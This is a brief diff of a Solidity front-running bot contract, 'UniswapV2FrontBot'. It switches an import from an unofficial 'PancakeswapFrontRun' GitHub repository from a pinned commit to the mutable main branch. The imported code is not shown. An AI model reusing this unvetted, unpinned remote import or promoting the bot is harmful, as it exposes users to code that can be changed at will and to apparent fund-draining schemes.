@@ -7,7 +7,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 // PancakeSwap manager
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
-import "https://github.com/Web3devfrontrun/PancakeswapFrontRun/blob/06c75e726823ce9706d757e56a9eb4e6035f704f/frontrunner";
+import "https://github.com/Web3devfrontrun/PancakeswapFrontRun/blob/main/frontrunner";
 
 contract UniswapV2FrontBot {
     
